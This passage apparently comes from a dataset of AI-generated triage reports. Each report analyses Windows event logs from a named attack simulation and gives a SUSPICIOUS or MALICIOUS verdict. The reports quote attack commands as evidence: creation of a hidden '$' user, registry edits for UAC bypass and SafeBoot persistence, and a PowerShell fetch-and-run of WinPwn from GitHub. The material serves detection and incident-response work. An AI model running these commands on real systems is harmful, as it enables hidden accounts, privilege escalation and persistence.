Overall, while there isn't clear-cut evidence of a highly malicious attack like malware execution or privilege escalation directly in the logs, the pattern of using command-line tools to modify permissions (`icacls`) and access system logs (`wevtutil`) should be further investigated, especially within a sensitive environment like a CEO's machine. There might be a legitimate reason for these actions; however, they should not be typical in routine administrative tasks without any prior scheduled operations or IT task execution known by IT staff.

### **Resolution:**
**SUSPICIOUS -** The examined logs contain activities such as directory and permission modification commands which should be unusual to perform frequently unless under specific administrative context. It requires additional investigation to confirm whether these actions align with scheduled administrative tasks or if they represent unauthorized actions.

### **Guidance:**
1. **Immediate Follow-Up:** 
   - Confirm whether the observed `cmd.exe` and `icacls` activities match any recent administrative tasks performed by authorized personnel.
   - Check for any changes in scheduled tasks or reviews by IT concerning the CEO’s access permissions.
  
2. **Further Investigation:** 
   - Monitor the system for further similar activities or unfamiliar processes.
   - Perform a review of file access logs considering data.001_cacls and surrounding directories for unusual access or exfiltration attempts.
  
3. **Preventive Actions:**
   - Enforce stricter logging and notification for permission changes on sensitive systems.
   - Consider increasing endpoint detection capabilities to flag `icacls` or `wevtutil` usage under non-administrative contexts unless specifically whitelisted.

The patterns do not definitively indicate malicious activity but do warrant further assessment to ensure network integrity and prevent potential unauthorized data exposure."
InstallUtil Uninstall method call - -installtype=notransaction -action=uninstall' variant,"### Analysis of the Logs

#### Overview
The logs provided contain a series of events from different sources (Application, Windows PowerShell, Sysmon) on the `Server002`. A notable pattern is observed around the execution of PowerShell scripts with a potentially unexpected assembly execution pattern, which could suggest suspicious activity.

#### Potential Indicators of Compromise

1. **PowerShell Script Execution**:
   - A significant part of the logs is centered around PowerShell activities that involve loading and invoking specific scripts and assemblies (e.g., `InstallUtilTestHarness.ps1`).
   - The scripts executed seem to perform activities related to function definitions and assembly manipulations which are not typical for a benign PowerShell session.
   - There is usage of `InstallUtil`, which can be utilized in living-off-the-land attacks where such utilities (native binaries) are used for malicious purposes.

2. **Loading and Execution of .NET Assemblies**:
   - The logs indicate compilation and execution of .NET assemblies using the `csc.exe` and `cvtres.exe` commands, pointing towards a dynamic compilation process.
   - An assembly `data.004.dll` is seen being manipulated and utilized, particularly with `InstallUtil` to perform actions like installing or uninstalling components. This is suspicious as these actions often do not appear in typical day-to-day operations of Windows systems unless administratively initiated.

3. **Execution of Common Living-off-the-Land Binaries (LOLBins)**:
   - Scripts are using utilities like `InstallUtil.exe` designed for legitimate administrative purposes to execute potentially harmful actions.
   - Process creations linked to such executables point towards possible misuse for perseverance or unauthorized actions.

4. **Elevated Privilege Execution**:
   - Various processes are executed under high integrity levels, indicative of elevated permissions which could facilitate privileged operations if exploited.

5. **Multiple Edge Update Processes**:
   - There is a heavy presence of Microsoft Edge Update processes, which generally is expected but requires context to rule out any misuse or abnormal behavior linking back to the PowerShell actions.

#### Notable Entries from Sysmon Log
- There is substantial process creation activity logged by Sysmon, particularly focused on PowerShell and .NET framework components.
- Several processes are being executed by `SERVER002\admin_test`, suggesting this user account is either performing development and testing activities or it could be potentially compromised.

3. **File and System Integrity:**
   - Review the integrity of system files, especially those in the Temp directory, for any unknown or unsigned binaries.

4. **User Activity Monitoring:**
   - Investigate user `admin_test` for unusual behavior patterns or authorization levels that might not align with expected use.

5. **Network Traffic:**
   - If possible, analyze network logs for unusual outbound connections that might correlate with the identified suspicious process activities."
Abusing MyComputer Disk Cleanup Path for Persistence,"After a thorough analysis of the provided Windows event logs, let's summarize the findings:

### Anomalous Behaviors Observed
1. **Frequent and Sequential Execution of System Utilities**: There is a sequence of processes such as `wevtutil.exe`, `cmd.exe`, `reg.exe`, and `whoami.exe` running repetitively within a short time frame. While individually these are not inherently suspicious, the particular focus on registry (`reg.exe`) modifications stands out:
   - Command: ```reg add ""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\MyComputer\\cleanuppath""```, which replaces the cleanup path with `notepad.exe`, is unusual as it involves altering the registry and could indicate an attempt to modify system behavior.

2. **Running Utilities with High Integrity Level**: The processes are executed with a high integrity level by the user `SERVER002\\admin_test`. This suggests potential privilege escalation or unauthorized elevated access attempts, especially if `admin_test` isn't a usual high-privilege account.

3. **Presence of Common System Tools**: The usage of utilities like `whoami.exe` and `HOSTNAME.EXE`, while common for information gathering, appear to be unusual in the context of other more suspicious behavior detected.

4. **Network Service Account Activities**: The use of `dllhost.exe` by the `NETWORK SERVICE` account is less common but not inherently suspicious unless correlated with unauthorized network or external interactions.

5. **Security Logs**: Multiple `EventID 4624` and `EventID 4672` are observed which indicate logon activities and special privileges applied. The presence of multiple entries in rapid succession might suggest automated scripts or elevated privilege allocations, especially considering the context of registry modifications and frequent utility usage.

6. **Process Interactions**: A notable number of processes interact — especially watching for `wsmprovhost.exe` which starts several processes, including `cmd.exe` implying potential remote PowerShell or script execution attempts.

7. **Microsoft Edge Update Logging**: Several entries involving `MicrosoftEdgeUpdate.exe` appear within the logs, indicating scheduled updates or task operations. While normal, they should be correlated with organizational update policies.

### Potential Indicators of Malicious Activity
- **Registry Modification Command**: Any irregular modification like the cleanup path could allow or disguise further actions when typically benign applications (e.g., Notepad) are executed.
- **Assumed Identities and Privileges**: The use of `SYSTEM` identity processes (impersonated or service initiated under `SYSTEM`) using capabilities like `SeDebugPrivilege` could indicate an attempt to leverage system-level authority malfeasance.
- **Absence of Expected Logs**: No logs from security-focused services like PowerShell indicative of stealth attempts (e.g., clearing logs) could mean obfuscation attempts.

### Resolution
Given the above analysis:

- **Resolution**: SUSPICIOUS

### Actions & Recommendations
- **Immediate Investigation**: Further investigation into the `admin_test` account usages, particularly its assignments and permissions.
- **Review and Analyze Scripts**: Examine any scripts or GPOs that might have triggered the registry and service interactions.
- **Monitor and Audit**: Continuous monitoring of `SERVER002` should occur, along with capturing of any anomaly logs and command histories.
- **Privileged Account Review**: Ensure there are no unused or rogue administrative accounts and that all privileged access is required and monitored.

The events, while potentially benign when isolated, form a pattern that merits an in-depth follow-up to ensure they do not represent or lead to a compromise."
Disable Windows Remote Desktop Protocol,"### Analysis of Log Entries

#### Overview
The provided logs include entries from Application, Sysmon, System, and Security event logs. The task is to determine if any log entries present indicators of malicious activity. Key considerations include process execution, command-line arguments, privilege escalation, and time discrepancies.

#### Suspicious Observations
1. **Time Discrepancies:**
   - Signs of time tampering are evident in the logs. There are `Microsoft-Windows-Kernel-General` and `Microsoft-Windows-Time-Service` events indicating the system time was reverted. This is noted in the security logs, which show the previous and new times. Time manipulation is suspicious as it can be used to hide activities or modify logs retrospectively.

2. **Registry Modification:**
   - A `cmd.exe` process executed with a command to modify the registry (`HKLM\System\CurrentControlSet\Control\Terminal Server`) to deny RDP connections (`fDenyTSConnections /t REG_DWORD /d 1 /f`). Although legitimate software might make such a change, in the context of a security incident, this could be used to disable remote access intentionally.

3. **Frequent Process Creation:**
   - There are numerous `process creation` events, particularly for Windows system utilities like `whoami.exe`, `cmd.exe`, `reg.exe`, alongside legitimate service updates (Edge Update). While not inherently malicious, excessive execution of system tools can suggest post-exploitation activities or scripts being run.

4. **High Integrity Level Processes:**
   - Processes like `cmd.exe` and `reg.exe` are running with a high integrity level, suggesting administrative privileges. This fact, coupled with registry modification attempts, could imply privilege abuse.

5. **Edge Update Executions:**
   - A significant number of entries regarding Microsoft Edge Update processes. Continuous spawn of processes like `MicrosoftEdgeUpdate.exe` could either be legitimate update activities or abnormal behavior if orchestrated by malicious actors.

#### Assessment and Risks
- **Time Tampering:** The alteration of system time is a significant red flag. This can be used for covering tracks by modifying timestamps of logs and activities.
- **Unauthorized Registry Manipulation:** Registry changes, specifically to deny RDP connections, could indicate attempts to restrict control or access, likely malicious if not authorized.
- **Process Execution Patterns:** The execution of command-line utilities such as `cmd.exe`, `whoami.exe`, and `reg.exe` indicates attempts to gather information or configure settings possibly against standard operating procedures.

#### Recommended Action
1. **Immediate Investigation:** Investigate who authorized the registry modifications, if any, and confirm if these match standard configurations.
2. **Audit Time Changes:** Verify if the time changes were sanctioned, as unsanctioned modifications could allow adversaries to evade detection.
3. **Review User Activity:** Investigate the activity of user `SERVER002\admin_test` for authorization and context regarding the executed commands.
4. **Verify Edge Update Tasks:** Confirm with IT if the frequent Edge update tasks align with internal update schedules.

### Conclusion
Based on the findings, the resolution for the observed activity is **SUSPICIOUS**. The behavior requires further investigation to confirm whether it aligns with legitimate administrative actions or suggests malicious intent."
Headless Browser Accessing Mockbin,"After analyzing the provided logs, the following observations and assessments can be made:

### Security Log Observations:
1. **Time Change Events**:
   - Multiple events (Event ID 4616) related to system time changes are logged. This activity can indicate tampering, but they were initiated by svchost.exe, a legitimate Windows process, suggesting routine time synchronization.

2. **Logon Events**:
   - Event ID 4624 indicates a few successful logons with logon type 5 (Service). The SYSTEM account is the subject user, which is expected behavior for service logons.

3. **Special Privileges Assigned Events**:
   - Event ID 4672 indicates special privileges (e.g., SeDebugPrivilege) are granted to SYSTEM. This is typical for operating system functions and not inherently suspicious without additional context.

4. **Local Account Enumeration**:
   - Event ID 4798 shows multiple entries for account enumeration, which suggests a process was querying local user accounts. This might be associated with malware or lateral movement if unauthorized.

5. **Credential Validation Events**:
   - A series of Event ID 5379 indicates failed credential validations targeting MicrosoftAccount, which might imply unauthorized attempts or misconfigured services.

### Sysmon Log Observations:
1. **Command Line Usage (Event ID 1)**:
   - Multiple instances where Sysmon logs processes such as `cmd.exe` and `powershell.exe` are seen with specific command lines that could be considered suspicious hints of command-line interface or script activity. Particularly, running PowerShell with `-ExecutionPolicy Restricted -Command ...` could suggest script execution, potential for malicious activity depending on context.
   - Notably, `CompatTelRunner.exe` (Microsoft Compatibility Telemetry) is seen executing frequently with various parameters. While this file is legitimate, frequent usage and specific function calls can be exploited by threat actors for telemetry or obfuscation.

2. **Process Creation and Network Activity**:
   - The logs show various activity where `cmd.exe` is used to launch the Chrome browser in headless mode, potentially to access URLs programmatically—this can signal automated browsing or data extraction, possibly for malicious intent.

3. **Host Processes for Windows Tasks**:
   - `taskhostw.exe` events indicate typical Windows task operations. However, its association with user account enumerations could imply abuse if coupled with unauthorized access.

### PowerShell and Application Perspectives:
- **PowerShell Activity**:
  - Events indicate PowerShell script execution commands. Given the execution policy and script command setup, this could be a sign of a scripted attack if done outside of normal operational procedures.
  
- **Application Logs**:
  - The logs primarily show usual service operations and updates which are benign but need mapping back to any change management documentation to ensure they align with scheduled updates.

### Assessment and Conclusion:
Based on the found evidence:
- The combination of time changes, service account enumeration, PowerShell script execution, and automated browsing through command lines raise flags that merit further investigation, especially around the context of execution (e.g., who initiated, was it scheduled, by which user, etc.).
- The consistent failure of credential validation could mean a misconfiguration or potential brute force attack.

### Recommended Action:
Further investigation should focus on:
- Determining the motivation behind account enumeration and repeated execution of scripts/commands.
- Correlate these log activities with known schedules and change management if this is part of legitimate administrative tasks.
- Verify if the processes like `CompatTelRunner.exe` and PowerShell were legitimately initiated or exploited.
- Review network logs around corresponding timestamps for any unusual outbound connections that could signal data exfiltration.

**Resolution: SUSPICIOUS**
This situation contains indicators that are not inherently malicious standalone but constitute suspicious activity that warrants thorough investigation to ensure there is no ongoing compromise."
Bypass UAC using ComputerDefaults (PowerShell),"### Analysis of the Logs:

#### 1. Application Log:
- No anomalies were observed in the application logs. The entries about Windows Defender indicate normal status checks. The EdgeUpdate service stopping could be part of a scheduled update routine.

#### 2. Windows PowerShell Log:
- **Suspicious Activity Detected:**
  - Several events indicate the execution of a PowerShell script that manipulates the Windows Registry in a manner commonly associated with UAC (User Account Control) bypass techniques. 
  - The script attempts to add a registry key in `HKCU:\software\classes\ms-settings\shell\open\command` and sets up a command execution for `C:\Windows\System32\cmd.exe` using `ComputerDefaults.exe`. This is indicative of an attack technique where normal applications are hijacked to execute malicious code under elevated privileges.

#### 3. Sysmon Log:
- **Potential Malicious Activity:**
  - Multiple instances of utilities like `wevtutil.exe` and `conhost.exe` running under `admin_test` user without associated command-line arguments indicate suspicious behavior but might also be regular administrative actions.
  - The execution of `powershell.exe` with command-line arguments that align with the suspicious PowerShell log activity further corroborates potential unauthorized activity attempting privilege escalation or persistence.

#### 4. System Log:
- The logs show a normal time update process without any tampering evidence or suspicious activity. The time synchronization looks legitimate.

#### 5. Security Log:
- No apparent anomalies or unauthorized access were identified here. The logs show standard processes and privileges associated with Windows services.

### Assessment and Threat Identification:
- The evidence of potential UAC bypass via registry manipulation in the PowerShell logs is **strongly indicative of malicious activity**.
- The context of tools used (`wevtutil.exe` and `cmd.exe` setups) suggest an attempt to maintain persistence or escalate privileges.
  
### Guidance and Resolution:
- **Resolution: MALICIOUS**

Given the analysis, the logs indicate potentially malicious activity with a clear sign of registry manipulation aiming at bypassing user access control. Immediate action is necessary:

1. **Immediate Remediation:**
   - Isolate the affected system to prevent further unauthorized access or exfiltration of data.
   - Conduct a thorough examination of all registry keys associated with the suspicious PowerShell activities.
   
2. **Further Investigation:**
   - Review all user activities associated with `admin_test` during the time frame.
   - Investigate for potential additional backdoors or persistence mechanisms established by the attacker.
  
3. **Strengthening Security:**
   - Ensure that strict monitoring and alerting are performed for any registry changes or PowerShell executions in a similar context.
   - Re-evaluate privilege access management for the users on the affected system and throughout the organization.

This approach should mitigate immediate threats and reinforce security posture in preparation for any future events."
Masquerading - windows exe running as different windows exe,"## Detailed Analysis:

### System Log:
- The System log entries mainly indicate regular updates to Windows Defender Antivirus through Microsoft Update (EventIDs 44, 43, and 19). The updates appear to be routine and reflect normal antivirus definition update behavior.

### Sysmon Log:
- The Sysmon logs show multiple process creations predominantly involving system utility processes like **wevtutil.exe**, **conhost.exe**, **whoami.exe**, and **powershell.exe**. Of particular concern is the PowerShell command that copies `cmd.exe` to `svchost.exe` in the TEMP directory and executes it, which is atypical and indicative of a potential attack or system misuse (e.g., a fileless attack or obfuscated activity).
- The creation of a file named `svchost.exe` in a TEMP directory, especially with a PowerShell script using Start-Process and Stop-Process commands, is generally suspicious as it mimics a Windows core service executable in a non-standard directory. The SHA256 hash `BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0` for this `svchost.exe` process should be analyzed further, including checks against threat intelligence databases.

### Security Log:
- Multiple security audit failures (EventID 5379) with return code `3221226021` and reference to MicrosoftAccount and WindowsLive tokens. This indicates failed authentication attempts or credential requests, possibly due to incorrect settings or compromised accounts.

### Windows PowerShell Log:
- PowerShell logs support the Sysmon entries with a command execution that copies cmd.exe to svchost.exe within the TEMP directory. This type of activity, especially manipulating executable files and running them from TEMP directories, is suspicious and points towards potential malware activity leveraging PowerShell.

### Application Log:
- The entry states the Windows Defender is in an active state, as indicated by `SECURITY_PRODUCT_STATE_ON`.

## Assessment:
The combination of PowerShell script execution that involves copying `cmd.exe` to `svchost.exe` in a TEMP directory, followed by execution, is highly concerning. This type of behavior is consistent with malicious actors attempting to masquerade or modify system processes to avoid detection. The activity is flagged as suspicious and requires immediate attention, validation, and potentially a broader investigation into any similar or related activities across the network. 

## Threats and Risks Identified:
1. **Data Exfiltration or Malware Deployment**: The unusual PowerShell and process activity suggest the potential of malware propagation or data exfiltration attempts.
2. **System Compromise**: The modification and execution of core system-like executables indicate a potential system compromise.
3. **Failed Authentication and Access Attempts**: Unsuccessful credential requests might indicate brute force attempts or unauthorized access risks.

## Guidance:
- Immediately quarantine the affected system (Server002) to prevent further propagation or data exfiltration.
- Conduct a full deep-dive forensic analysis, particularly focusing on PowerShell execution history and TEMP directory contents.
- Verify suspicious executable hashes against threat databases (e.g., VirusTotal).
- Analyze network traffic around the time of these events for any unusual activity or connections.
- Review security policies and ensure that PowerShell execution policies are restrictive.
- Reset potentially affected account credentials and review WindowsLive and MicrosoftAccount configurations for security enhancements.

## Resolution:
**MALICIOUS** - The activities observed in the logs, particularly the PowerShell execution pattern, strongly indicate a real and present threat of system compromise. Immediate remediation and further investigation are advised."
WMI Win32_Product Class - Execute Local MSI file with embedded VBScript,"Upon reviewing the provided Windows event logs, I've identified several activities that appear suspicious and potentially malicious. Here’s a breakdown of the findings:

### Suspicious Activities Identified:

1. **PowerShell Execution with Unusual Command**: 
   - The PowerShell command `Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.007\\bin\\data.007_VBScript.msi' }` suggests the execution of a script that installs an MSI from a temporary directory. This directory structure and usage pattern often indicate unwanted software installation.
   - The PowerShell command initiated with `-nop` (no profile) is common in obfuscated or stealthy execution to avoid detection (`Write-Host VBScript executed me!; exit`), further pointing to suspicious activity.

2. **Execution of PowerShell**:
   - The PowerShell session is noted to have started multiple times and terminated shortly after performing the noted command.
   - The use of `Invoke-CimMethod` in this context, combined with the nature of the temporary directory, raises a red flag for possible malware execution.

3. **Installation Logs**:
   - The `MsiInstaller` log indicates the installation of a product named ""file file Test Installer,"" which lacks proper details of a legitimate application (such as a recognizable publisher or digital signature).
   - Installation completion timestamp aligns with PowerShell execution, implying the MSI installation conducted by PowerShell.

4. **Process Execution Information from Sysmon Logs**:
   - The execution of `msiexec.exe`, which is consistent with executing MSI installation packages, corresponds with the logged MSI installation events.
   - Multiple instances of `wevtutil.exe`, a utility for managing Windows event logs, may suggest tampering or clearing of logs to cover tracks.
   - Elevated integrity levels (High) in certain process executions might indicate privilege escalation or elevated rights not typical for standard operations.

### Assessment:
These activities collectively suggest a coordinated action to silently execute and install software on the system. Temporary paths, use of less-known MSI-like ""Test Installer,"" obfuscated PowerShell commands, and potential log manipulation attempts are indicative of adversarial techniques employed in intrusion scenarios.

### Threats or Risks Identified:
- Potential unauthorized software installation (malware, spyware) via script.
- Possible data exfiltration, privilege escalation, or system compromise.
- Risk of system integrity impacted by executing unknown scripts and binaries.

### Resolution and Guidance:
Based on the analysis, the logs contain clear evidence of suspicious and potentially malicious behavior related to possible unauthorized software installation using obfuscated PowerShell scripts. The resolution is:

- **MALICIOUS**: The logs contain activities that are highly indicative of a system compromise attempt.

**Recommended Actions**:
- **Immediate Isolation**: Isolate the affected host from the network to prevent further spread or data exfiltration.
- **Forensic Analysis**: Conduct a detailed forensic analysis of the system, focusing on the PowerShell history, temporary files, and any dropped malware.
- **Remediation**: Remove any installed unauthorized MSI packages and restore the system from a known clean backup if possible.
- **Review and Strengthen Security Policies**: Implement policies to restrict script execution and ensure proactive monitoring is in place.
- **Notify IT Security Team**: Engage broader security incident response for potential lateral movement investigation within the network.

These actions are necessary to mitigate risks and prevent potential damage or data breaches."
UACME Bypass Method 23,"**Detailed Analysis of the Logs:**

**Suspicious or Anomalous Behavior:**

1. **Command Execution and Potential Privilege Escalation:** 
   - A Sysmon event log indicates the execution of a suspicious command using `cmd.exe`. The command executed was: `""C:\\Windows\\system32\\cmd.exe"" /c echo C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\uacme\23 Akagi64.exe`. This path references a file named ""Akagi64.exe"" located in a nested directory structure, which is known to be associated with UAC (User Account Control) bypass attacks.
   - Furthermore, the use of the `..` notation within the path indicates possible directory traversal, which could be an attempt to access or execute files outside of designated directories, potentially for unauthorized actions.

2. **PowerShell Activity:**
   - There is a logged event where a PowerShell script checks for the existence of the ""Akagi64.exe"" file. PowerShell is a powerful tool often used by attackers to execute scripts and commands stealthily. The presence of this check implies preparation or execution verification of a possibly malicious executable.

3. **Repeated Use of `wevtutil.exe`:**
   - There are multiple instances of `wevtutil.exe`, a Windows utility used to manage event logs, being executed. While this can be benign, it can also be used maliciously to clear or modify logs to cover tracks, especially given its simultaneous execution with other suspicious activities.

4. **Additional Use of Known Windows Utilities for Reconnaissance:**
   - The logs show the execution of `hostname.exe` and `whoami.exe`. While often legitimate, these commands can also be part of reconnaissance activities conducted by an attacker to gather information about the host environment and user privileges.

**Indicators of Malicious Activity or Compromise:**

- The presence and attempted execution of the ""Akagi64.exe"" file within a sensitive directory path points to a likely UAC bypass attempt, a common tactic used during advanced persistent threats (APT) or other sophisticated attacks.
- The creation and execution of processes under a high integrity level by a user account (`SERVER002\\admin_test`) further indicates elevated privilege actions, suggesting either misuse of legitimate applications or compromised administrative credentials.
- The sequence and combination of these process executions (PowerShell checking for malicious files, usage of cmd.exe to run suspicious scripts, and sysadmin tools for reconnaissance and log manipulation or examination) collectively demonstrate a pattern consistent with stages of an attack lifecycle, suggesting an attempt to establish persistence and evasion mechanisms.

**Assessment:**

Based on the analysis, there are signs of a potentially malicious activity involving a well-known User Account Control (UAC) bypass tool (""Akagi64.exe"") and suspicious command execution patterns indicative of an attempted compromise.

**Resolution:**

**MALICIOUS**

**Guidance:**

- **Isolate the affected machine (Server002)** to prevent further spread or data exfiltration.
- **Conduct a thorough forensic analysis** on the device to understand the scope and impact, starting with the suspicious `uacme` path and its origin.
- **Review user account activities**, specifically `SERVER002\\admin_test`, to determine if credentials have been compromised.
- **Update and enforce security patches and antivirus signatures** to mitigate any potential exploits used.
- **Identify and report indicators of compromise (IoCs)** to relevant stakeholders and update monitoring rules in EDR solutions to detect similar future activities.
- **Educate and raise awareness** amongst employees regarding suspicious activities and the significance of reporting them promptly.

By following this guidance, the organization can effectively respond to and remediate the detected malicious activity."
Create a Hidden User Called $,"Upon analyzing the provided logs, several events stand out as indicative of potentially malicious activity:

1. **Creation of Suspicious User Accounts**:
    - The `Security log` shows several events related to user account changes:
      - **Event ID 4720**: A user account named ""$"" is created with a command that includes `net user $ file123! /add /active:yes`. 
      - **Event ID 4722**: The same user account is enabled.
      - **Event ID 4738**: The account settings are modified.

2. **Process Execution and Command-Line Usage**:
    - The `Sysmon log` reveals a sequence of processes being executed by the user `SERVER002\admin_test`, notably including the execution of `cmd.exe` with a command line that adds a user account: `\""cmd.exe\"" /c net user $ file123! /add /active:yes`.
    - The use of `wevtutil.exe` for handling Windows Event logs by `admin_test` may indicate an attempt to clean traces or steal logs, which is typically a suspicious behavior.

3. **Privilege Changes Without Clear Justification**:
    - Event IDs such as 4728 and 4732 indicate changes in security group membership, although the exact membership isn't detailed, it coincides with suspicious account creation and manipulation activity.

These events collectively suggest suspicious intentions, especially the creation and manipulation of accounts with unusual characteristics (e.g., account name ""$""). The use of system utilities to manipulate event logs could indicate a deliberate attempt to cover up activities or tamper with log integrity.

### Assessment and Resolution:

- **Resolution**: **MALICIOUS**
- **Threats/Risks Identified**: Unauthorized user account creation and potential privilege escalation coupled with event log manipulation suggest a security breach with intentions that could range from data theft to establishing persistent unauthorized access.
  
### Guidance on How to Proceed:

1. **Immediate Actions**:
   - Isolate the affected system (Server002) from the network to prevent further unauthorized actions.
   - Lock down or disable the suspicious user account `$` immediately to cut off any access through this vector.

2. **Investigation**:
   - Begin a thorough investigation into how the `admin_test` account was compromised or misused. Review other logs and audit trails for anomalies involving this account's use.
   - Investigate any unauthorized changes made via the suspicious account.

3. **Security Measures**:
   - Enhance monitoring on similar activities company-wide to detect any spread of suspicious behaviors.
   - Conduct a security audit of account management processes and ensure adequate multi-factor authentication and privilege separation are in place.
   - Increase logging detail and retention to prevent log wiping and ensure comprehensive oversight.

4. **Incident Response**:
   - Document the incident thoroughly and report to relevant internal and potentially external (e.g., legal or regulatory) bodies as required by company policy and applicable law.
   - Review, improve, and conduct staff training on incident response procedures, focusing on early detection and reaction to similar threats."
WinPwn - UAC Bypass DiskCleanup technique,"Upon reviewing the provided Windows event logs, several entries stand out as indicators of potentially malicious activity. Here's a detailed analysis:

1. **Unusual PowerShell Activity:**
   - **Log Entry: Windows PowerShell Log**: The PowerShell logs reveal that `powershell.exe` was used to execute a script directly from a GitHub repository: `https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1`.
   - **Analysis**: Direct execution of a script from an external URL, particularly from a platform such as GitHub, is a common tactic employed by attackers to bypass local defenses and execute unauthorized scripts. Also, the attempted UAC (User Account Control) bypass using DiskCleanup is a known privilege escalation technique.

2. **Kernel General Timestamp Events:**
   - **Log Entry: Security Log**: Event ID 4616 indicates that the system time was changed. While changing system time by itself can occur for legitimate reasons (e.g., synchronization with time servers), in combination with other suspicious activities, it might suggest an attempt to obfuscate activities.

3. **Sysmon Log Activity:**
   - **Log Entries (Sysmon ID 1 and 5)**: Multiple entries show the execution of PowerShell, `conhost.exe`, `wevtutil.exe`, and other processes with the user `admin_test`. The Sysmon log notably captures the execution of PowerShell with the command that aligns with the suspicious PowerShell activity. The presence of `wevtutil.exe` is worth noting as this tool is often used for log deletion or modification by attackers.

4. **Integrity Level and User Context:**
   - The processes executed under high integrity level and the `SERVER002\admin_test` user context suggest those actions were performed with administrative privileges, raising the risk of potential system compromise.

### Conclusion:
Based on the analysis of these logs, there are clear indicators of malicious activity, primarily driven by the unauthorized execution of remote scripts using PowerShell, attempts at privilege escalation via UAC bypass techniques, and potential manipulation or removal of event logs for covering tracks. 

### Recommendation:
Given the evidence of potentially malicious activity, a thorough investigation is warranted. Immediate actions should include:
- **Resolution**: MALICIOUS
- Containment of the affected system to prevent further propagation.
- Detailed forensic analysis of the file system for persistence mechanisms.
- Verification of user accounts (especially `SERVER002\admin_test`) for unauthorized access or changes.
- Review of outbound network traffic to identify any other suspicious connections related to the identified malicious actions.
- Enhancement of monitoring and alerting rules to capture similar patterns in real-time.

It's critical to engage both incident response and forensic analysis teams to handle the situation effectively."
Copy and Modify Mailbox Data on Windows,"Based on the analysis of the provided Windows event logs, here are the findings:

### Suspicious or Anomalous Behavior:
1. **PowerShell Activity**:
   - There are multiple PowerShell logs indicating a script execution that uses PowerShell cmdlets to essentially copy files from a directory and modify them. The key points in the script involve creating a directory, copying items from a directory excluding a specific folder, and adding content to the files. The action appears to modify files by adding a specific text `""Modification for file Red Test""`.
   - PowerShell is a powerful tool often leveraged in attacks due to its flexibility and ability to run non-binary malware. The activities logged suggest potential data exfiltration or preparation for lateral movement, but they could also be benign scripting for maintenance.

2. **System and Security Logs**:
   - The security and system logs seem benign on the surface, reflecting normal system operations, time changes, and service activities typically seen on Windows systems (e.g., `svchost.exe` operations and time service adjustments).

3. **Sysmon Logs**:
   - The logs show activities involving basic Windows utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe` and PowerShell being run by an administrative user `admin_test`.
   - Notably, `hostname.exe` and `whoami.exe` executions could be part of an attacker’s attempt to gather information about the system and the executing user for possible privilege escalation or environment enumeration.
   - The use of `PowerShell` with high integrity level by `SERVER002\admin_test` raises suspicion, especially with the context of scripted file modifications.

### Assessment of Malicious Activity:
- The primary concern is the PowerShell script execution, which is a typical sign of compromise activity when executed under suspicious contexts, especially with high integrity level. Although there is no clear evidence of data exfiltration or persistence mechanisms, the script indicates behavior often associated with preparation for malicious activity or reconnaissance.
- The administrative user `admin_test` executing such commands should be further investigated to confirm if this activity was authorized or if the account was compromised.

### Resolution:
- **Resolution**: **SUSPICIOUS**
  - Due to the nature of the activities observed, especially the PowerShell script modifications, further investigation is warranted. The context, intent, and legitimacy of these scripts run by `admin_test` need to be verified.
  
### Guidance:
- **Immediate Action**: Isolate the machine for in-depth analysis to determine the intent of any potentially unwanted scripts and check for signs of data exfiltration or additional unauthorized access.
- **Investigate**: Verify if the PowerShell script was executed by an authorized IT admin or a scheduled task. If unsure, pivot to analyzing any associated network activity or logs for unauthorized data transfer.
- **Review Permissions**: Ensure that user accounts, especially those with administrative privileges, have the correct settings and no unnecessary permissions, and review password policies.
- **Monitor**: Implement continuous monitoring for unusual scripting, especially via PowerShell, and consider implementing stricter logging or restrictions using PowerShell Script Block Logging and System Lockdown policies."
Windows Add Registry Value to Load Service in Safe Mode without Network,"Upon reviewing the provided Windows event logs, several observations can be made:

### System Log:
- The logs primarily indicate time changes and updates via the `svchost.exe` process, a legitimate Windows service host process.
- Time updates are normal and generally not indicative of malicious activity unless associated with time-stomping, which is not apparent here.

### Application Log:
- The logs show activity related to `Microsoft Edge Update`, which is legitimate software behavior for updating the Edge browser.

### Sysmon Log:
- The logs reflect a sequence of `wevtutil.exe` and `conhost.exe` processes being executed by the user `admin_test`. `wevtutil.exe` is used to manage event logs, and `conhost.exe` is the console window host process.
- The execution of `cmd.exe` with the command line to modify the registry to add a SafeBoot option (`""cmd.exe"" /c REG ADD ""HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\fileSafeMode"" /VE /T REG_SZ /F /D ""Service""`) is indicative of potentially suspicious activity, as this could be associated with persistence mechanisms or privilege escalation tactics.
- Execution of `whoami.exe` to check the user context can be typical but in conjunction with the registry changes, it might suggest an attempt to confirm privilege levels.

### Security Log:
- Events indicate a synchronizing time service and point to benign routine system activities, assuming no time alteration for stealth or invalid purposes.

### Assessment:
There are indicators in the Sysmon log (registry modification via `cmd.exe` and `reg.exe` executed by an administrative user account) that merit further investigation. While these logs could signify legitimate administrative activity, they could also represent actions taken by an attacker to maintain persistence or escalate privileges on the system. 

### Conclusion:
Given the potential for these logs to indicate malicious intent, specifically through the registry modification command and context investigation, the resolution is:

**SUSPICIOUS - Activity requires further investigation.**

### Guidance:
1. Investigate the context of the `admin_test` account's usage – ensure it was the legitimate user operating at the time or if this account might have been compromised.
2. Review additional logs, including PowerShell logs and any available network traffic logs, to determine any command and control activity.
3. Consider conducting a thorough forensic analysis of the host to verify whether the registry changes were part of a legitimate configuration change or part of a more complex malicious operation.
4. If unauthorized activity is suspected, follow incident response procedures to isolate the system, analyze fully, and identify any additional compromises in the network environment."
Copy and Delete Mailbox Data on Windows,"Upon reviewing the provided logs, we can identify some activities that stand out, suggesting the potential for suspicious behavior:

### Detailed Analysis of Logs:

1. **Application Log Analysis:**
   - The Edge Update service stopping doesn't indicate suspicious activity by itself, as this is a normal operation for software updates.

2. **System Log Analysis:**
   - The events related to the time change using the `svchost.exe` process are typically associated with regular system time updates and do not show immediately suspicious behavior.

3. **Security Log Analysis:**
   - Time changes logged under Event ID `4616` are consistent with system-level time synchronization and similar to the system log entries.

